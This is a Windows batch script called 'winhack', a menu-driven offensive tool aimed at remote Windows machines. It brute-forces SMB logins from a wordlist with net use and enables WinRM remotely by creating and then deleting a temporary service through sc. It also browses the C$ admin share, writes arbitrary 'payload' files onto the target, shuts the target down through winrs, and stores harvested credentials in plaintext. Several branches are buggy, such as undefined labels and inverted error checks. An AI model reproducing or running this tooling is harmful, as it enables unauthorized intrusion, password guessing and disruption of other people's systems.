@echo off
chcp 65001 > nul
setlocal enabledelayedexpansion
title winhack
mode con cols=80 lines=35

rem globals scope setup
set "hostlabel=hostname"
set "userlabel=username"
set "paslabel=password"
set  wait=[93m[=][0m
set  success=[94m[+][0m
set  failed=[91m[-][0m
set  servicename=winrm%random%
set "time=timeout /t 0 > nul"
set  option1=[34m(1)[0m
set  option2=[35m(2)[0m
set  option3=[36m(3)[0m
set  option4=[37m(4)[0m
set  op=[32m1[0m
set  op2=[32m2[0m
set  op3=[32m3[0m
set  op4=[32m4[0m
set  op5=[32m5[0m

:main
cls
echo ██     ██ ██ ███    ██ ██   ██  █████   ██████ ██   ██ 
%time%
echo ██     ██ ██ ████   ██ ██   ██ ██   ██ ██      ██  ██  
%time%
echo ██  █  ██ ██ ██ ██  ██ ███████ ███████ ██      █████
%time%   
echo ██ ███ ██ ██ ██  ██ ██ ██   ██ ██   ██ ██      ██  ██
%time%  
echo  ███ ███  ██ ██   ████ ██   ██ ██   ██  ██████ ██   ██
echo.
echo =====================================================
echo %op%:RM %op2%:bruteforce %op3%:exit %op4%:store data
echo %op5%:show cred saved
echo =====================================================
echo.
choice /c:12345 /n /m "<=# "

if %errorlevel% == 1 ( goto RM )
if %errorlevel% == 2 ( goto bruteforce )
if %errorlevel% == 3 ( goto esit )
if %errorlevel% == 4 ( goto storing )
if %errorlevel% == 5 ( goto showcred )

:RM
echo   /=====0=====\
echo   ^| %hostlabel%  ^|
echo   \===========/
set /p hostname="<=# "
echo.
echo   /=====0=====\
echo   ^| %userlabel%  ^|
echo   \===========/
set /p username="<=# "
echo.
echo   /=====0=====\
echo   ^| %paslabel%  ^|
echo   \===========/
set /p password="<=# "

echo connecting to server %wait%
rem remote access
net use \\%hostname% /user:%username% %password% > nul 2>&1
net use \\%hostname% /user:%username% %password% > nul 2>&1

if /I "%errorlevel%" NEQ "0" ( 

    echo access denied. Credentials incorrect %failed%
    pause > nul
    goto main
)

echo connection done with successfull %success%

:winrm
echo Checking for WinRM...
chcp 437 >nul
powershell -Command "Test-WSMan -ComputerName %hostname%" >nul 2>&1
chcp 65001 >nul

if /I "%errorlevel%" NEQ "0" (
  echo %info% Creating Remote Service...
  rem Creates a service on the remote PC that enables WinRM
  sc \\%hostname% create %servicename% binPath= "cmd.exe /c winrm quickconfig -force"
  echo %success% Configuring WinRM...
  sc \\%hostname% start %servicename%
  rem erase
  echo %servicename% 
  sc \\%hostname% delete %servicename%
  goto menu
)

if /I "%errorlevel%" NEQ "0" (
  chcp 65001 >nul
  echo %success% %hostname% has WinRM Enabled!
  timeout /t 3 >nul
  goto option
)

:option
cls
chcp 65001 > nul
echo  ██████  ██████  ████████ ██  ██████  ███    ██ 
%time%
echo ██    ██ ██   ██    ██    ██ ██    ██ ████   ██ 
%time%
echo ██    ██ ██████     ██    ██ ██    ██ ██ ██  ██ 
%time%
echo ██    ██ ██         ██    ██ ██    ██ ██  ██ ██ 
%time%
echo  ██████  ██         ██    ██  ██████  ██   ████
echo.
echo %success% connected to %hostname%
echo. 
echo %option1% go to file system
echo %option2% go to main display
echo %option3% create a payload
echo %option4% shutdown the machine
echo.
choice /c:1234 /n /m "<=# "

if %errorlevel% == 1 ( goto filez )
if %errorlevel% == 2 ( goto back )
if %errorlevel% == 3 ( goto payload )
if %errorlevel% == 4 ( goto shut )

:filez
start "" "\\%hostname%\C$"
cls
goto option

:payload
start "" "\\%hostname%\C$\users\"
goto nano

:nano
set /p filename="file name & extension: "
goto loop
:loop
set /p "writer=>> "
echo %writer% >> %filename%

if /I "%writer%" NEQ "::" ( goto main )

goto loop

:shut
winrs -r:%hostname% -u:%username% -p:%password% shutdown /s /t 0
if %errorlevel% == 0 ( goto option )

:back
echo back to main display
%time%
net use \\%domain% /d /y >nul 2>&1
goto main

:bruteforce
set /p wordlist="select a wordlist: "
echo.
echo   /=====0=====\
echo   ^| %hostlabel%  ^|
echo   \===========/
set /p hostname="<=# "
echo.
echo   /=====0=====\
echo   ^| %userlabel%  ^|
echo   \===========/
set /p username="<=# "
echo.
echo   /=====0=====\
echo   ^| %paslabel%  ^|
echo   \===========/
set /p password="<=# "

for /f %%a in (%wordlist%) do (

set pass=%%a
call :attempt
)

:success
echo password founded:%pass%
net use \\%hostname% /d /y > nul 2>&1
pause > nul
goto winrm

:attempt
net use \\%hostname% /user:%username% %pass% > nul 2>&1
set /a count=1
echo %count%+1:attempt with:%pass%
if %errorlevel% == 0 goto success


:esit
cls
echo ██████  ██    ██ ███████
%time% 
echo ██   ██  ██  ██  ██
%time%      
echo ██████    ████   █████
%time%   
echo ██   ██    ██    ██
%time%      
echo ██████     ██    ███████
timeout /t 1 > nul
exit


:storing 
mkdir Credentials
cd Credentials
echo Here is where storing the data > Credentials.bat
echo  ===================== >> Credentials.txt
echo  hostname:%hostname%   >> Credentials.txt
echo  username:%username%   >> Credentials.txt
echo  password:%password%   >> Credentials.txt
echo  ===================== >> Credentials.txt
goto main


:showcred
cd Credentials
type Credentials.txt
cd ..
pause > nul
goto main
